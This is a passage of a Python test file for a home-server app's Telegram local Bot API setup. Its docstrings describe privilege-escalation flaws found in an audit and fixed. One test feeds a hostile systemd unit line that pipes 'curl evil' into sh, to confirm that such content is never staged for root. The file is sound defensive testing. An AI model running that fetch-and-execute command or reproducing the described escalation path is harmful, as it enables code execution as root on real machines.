             patch("app.routes.telegram_routes._activate_local_api", new=AsyncMock()), \
             patch("app.routes.telegram_routes._send_2gb_confirmation", new=AsyncMock()):

            resp = await client.post(
                "/api/v1/telegram/setup-local-api",
                json={"api_id": 12345, "api_hash": "abcdef1234567890"},
                headers=auth_headers,
            )
            assert resp.status_code == 202
            job_id = resp.json()["job_id"]

            # Let background task complete
            await asyncio.sleep(0.2)

            job = get_job(job_id)
            assert job is not None
            assert job.status == "completed"
            # Should not have attempted a build
            assert not any("cmake" in c for c in calls)
            assert not any("git clone" in c for c in calls)

    async def test_setup_build_dep_install_failure(self, client, auth_headers):
        """When deps install fails, job reports failure."""
        from app.job_store import get_job

        step = {"count": 0}

        async def fake_run_command(cmd, timeout=30):
            cmd_str = " ".join(str(c) for c in cmd)
            if "systemctl is-active" in cmd_str:
                return (3, "inactive\n", "")
            if "dpkg -s" in cmd_str:
                return (1, "", "not installed")
            return (0, "", "")

        # apt-get install now runs inside ahc-telegram-apt-deps.service (a
        # fixed, non-parameterized unit -- see the docstring on
        # _install_apt_deps() in telegram_routes.py for why: apt-get isn't
        # syscall- or D-Bus-mediated, so it needs the same host-namespace
        # escape as the storage mount fix, not a direct sudo call), so
        # simulating its failure means mocking that helper directly rather
        # than a "apt-get install" substring in the raw command list.
        with patch("app.routes.telegram_routes.run_command", side_effect=fake_run_command), \
             patch("app.routes.telegram_routes.Path.exists", return_value=False), \
             patch("app.routes.telegram_routes._install_apt_deps",
                   new=AsyncMock(return_value=(False, "E: Unable to locate package"))):

            resp = await client.post(
                "/api/v1/telegram/setup-local-api",
                json={"api_id": 12345, "api_hash": "abcdef1234567890"},
                headers=auth_headers,
            )
            job_id = resp.json()["job_id"]
            await asyncio.sleep(0.3)

            job = get_job(job_id)
            assert job is not None
            assert job.status == "failed"
            assert "build tools" in (job.error or "").lower()

    async def test_send_2gb_confirmation_sends_to_linked(self):
        """_send_2gb_confirmation sends messages to all linked chat IDs."""
        mock_bot = MagicMock()
        mock_bot.send_message = AsyncMock()

        mock_app = MagicMock()
        mock_app.bot = mock_bot

        with patch("app.telegram_bot._application", mock_app), \
             patch("app.telegram_bot._get_linked_ids", AsyncMock(return_value=["111", "222"])):

            from app.routes.telegram_routes import _send_2gb_confirmation
            await _send_2gb_confirmation()

            assert mock_bot.send_message.call_count == 2
            # Check messages mention 2 GB
            for call in mock_bot.send_message.call_args_list:
                assert "2 GB" in call.kwargs.get("text", call.args[0] if call.args else "")

    async def test_setup_full_build_happy_path(self, client, auth_headers, tmp_path):
        """Full happy path: all deps present, binary absent, full build succeeds,
        service started, health-check passes, 2GB mode activated."""
        from app.job_store import get_job
        from app.routes.telegram_routes import _BINARY_PATH

        commands_called: list[str] = []

        async def fake_run_command(cmd, timeout=30):
            cmd_str = " ".join(str(c) for c in cmd)
            commands_called.append(cmd_str)
            if "systemctl is-active" in cmd_str:
                return (3, "inactive\n", "")
            if "dpkg -s" in cmd_str:
                return (0, "Status: install ok installed", "")
            if "git clone" in cmd_str:
                return (0, "", "")
            if "cmake" in cmd_str:
                return (0, "", "")
            if "daemon-reload" in cmd_str:
                return (0, "", "")
            if "systemctl enable" in cmd_str:
                return (0, "", "")
            if "curl" in cmd_str:
                return (0, "OK", "")
            return (0, "", "")

        original_exists = Path.exists

        def fake_path_exists(self_path):
            path_str = str(self_path)
            if path_str == _BINARY_PATH:
                return False  # binary not yet installed
            if "telegram-bot-api-build/build/telegram-bot-api" in path_str:
                return True  # built binary exists
            return original_exists(self_path)

        real_sleep = asyncio.sleep

        async def mock_sleep(t):
            await real_sleep(0)  # just yield control, don't actually wait

        # Binary/service-unit install now stage real files under
        # /var/lib/aihomecloud/telegram_setup_staging (owned by the
        # aihomecloud service account) before asking systemd to copy them
        # into place -- see _install_binary_from()/_install_service_unit() in
        # telegram_routes.py. The test process runs as a different user, so
        # the real staging I/O would hit a real PermissionError; mock these
        # two helpers directly rather than the filesystem underneath them.
        # Their own staging+escape behavior is covered separately by
        # test_install_binary_from_stages_and_starts_unit /
        # test_install_service_unit_stages_and_starts_unit below.
        from app.routes import telegram_routes as _tr

        with patch("app.routes.telegram_routes.run_command", side_effect=fake_run_command), \
             patch.object(Path, "exists", fake_path_exists), \
             patch("asyncio.sleep", new=mock_sleep), \
             patch("app.routes.telegram_routes._cleanup_build"), \
             patch("app.routes.telegram_routes._install_binary_from",
                   new=AsyncMock(return_value=(True, ""))), \
             patch("app.routes.telegram_routes._install_service_unit",
                   new=AsyncMock(return_value=(True, ""))), \
             patch.object(_tr, "_ENV_PATH", str(tmp_path / "telegram-bot-api.env")), \
             patch("app.routes.telegram_routes._activate_local_api", new=AsyncMock()), \
             patch("app.routes.telegram_routes._send_2gb_confirmation", new=AsyncMock()):

            resp = await client.post(
                "/api/v1/telegram/setup-local-api",
                json={"api_id": 12345, "api_hash": "abcdef1234567890"},
                headers=auth_headers,
            )
            assert resp.status_code == 202
            job_id = resp.json()["job_id"]

            # Wait for background task — mock_sleep yields immediately so it
            # completes quickly once we hand back control.
            await real_sleep(0.5)

        job = get_job(job_id)
        assert job is not None, "Job not found"
        assert job.status == "completed", f"Expected completed, got {job.status}: {job.error}"
        assert any("git clone" in c for c in commands_called)
        assert any("cmake" in c for c in commands_called)
        assert any("curl" in c for c in commands_called)

    async def test_install_binary_lands_in_service_owned_dir_without_root(self, tmp_path):
        """
        The binary must be installed by this process into its own directory — no root, no systemd.

        This test previously asserted the opposite: that the file was staged and a root oneshot
        (ahc-telegram-install-binary.service) was started to copy it into /usr/local/bin and chmod
        it 755. This process *builds or downloads* those bytes itself, and polkit let it start that
        unit — so it chose what root installed as a system executable. The test was asserting the
        escalation worked. The unit runs the binary as this same unprivileged user anyway, so the
        root step protected nothing; the fix deletes the boundary rather than guarding it.
        (2026-08-08 audit, C-3.)
        """
        from app.routes import telegram_routes

        source = tmp_path / "downloaded-binary"
        source.write_bytes(b"fake elf binary content")
        dest = tmp_path / "bin" / "telegram-bot-api"

        with patch.object(telegram_routes, "_BINARY_PATH", str(dest)), \
             patch("app.routes.telegram_routes.run_command", new_callable=AsyncMock) as mock_cmd:
            ok, err = await telegram_routes._install_binary_from(source)

        assert ok is True, err
        assert dest.read_bytes() == b"fake elf binary content"
        assert dest.stat().st_mode & 0o111, "installed binary is not executable"
        mock_cmd.assert_not_called()   # no systemctl, no root helper, no privilege at all

    async def test_install_binary_replaces_a_running_binary(self, tmp_path):
        """
        Overwriting the previous binary must work even while the old one is executing.

        Copying onto a running executable fails with ETXTBSY, which would make every upgrade after
        the first fail on a board where the bot is actually running — the case that matters and the
        one a fresh-install test never reaches. rename(2) relinks the directory entry instead.
        """
        from app.routes import telegram_routes

        dest = tmp_path / "bin" / "telegram-bot-api"
        dest.parent.mkdir()
        dest.write_bytes(b"old version")
        source = tmp_path / "new-binary"
        source.write_bytes(b"new version")

        with patch.object(telegram_routes, "_BINARY_PATH", str(dest)):
            ok, err = await telegram_routes._install_binary_from(source)

        assert ok is True, err
        assert dest.read_bytes() == b"new version"

    async def test_install_service_unit_never_stages_caller_content(self, tmp_path):
        """
        The unit must be generated by the root helper, never supplied by this process.

        This test previously asserted the opposite — that the caller's string was written to
        /var/lib/aihomecloud/telegram_setup_staging for a root oneshot to copy verbatim into
        /etc/systemd/system. That directory is owned by the unprivileged service user and polkit
        lets that user start the resulting unit, so anything able to write as this user chose what
        root executed. The test was asserting the escalation worked. (2026-08-08 audit.)
        """
        from app.routes import telegram_routes

        staging = tmp_path / "staging"
        staging.mkdir()
        with patch("app.routes.telegram_routes.run_command", new_callable=AsyncMock) as mock_cmd:
            mock_cmd.return_value = (0, "", "")
            ok, err = await telegram_routes._install_service_unit(
                "[Service]\nExecStart=/bin/sh -c 'curl evil|sh'\n"
            )

        assert ok is True
        # The hostile content must not exist anywhere the root helper could reach.
        assert not (staging / "telegram-bot-api.service").exists(), \
            "caller content was staged — root would copy it"
        mock_cmd.assert_called_once_with(
            ["systemctl", "start", "ahc-telegram-install-service-unit.service"], timeout=30
        )

    async def test_install_apt_deps_runs_fixed_unit(self):
        """_install_apt_deps() must run the fixed, non-parameterized
        ahc-telegram-apt-deps.service -- the package list lives in the unit
        file itself (scripts/systemd/ahc-telegram-apt-deps.service), not
        passed as a command argument, so there's no injection surface."""
        from app.routes import telegram_routes

        with patch("app.routes.telegram_routes.run_command", new_callable=AsyncMock) as mock_cmd:
            mock_cmd.return_value = (1, "", "some apt error")
            ok, err = await telegram_routes._install_apt_deps()

        assert ok is False
        assert err == "some apt error"
        mock_cmd.assert_called_once_with(
            ["systemctl", "start", "ahc-telegram-apt-deps.service"], timeout=300
        )
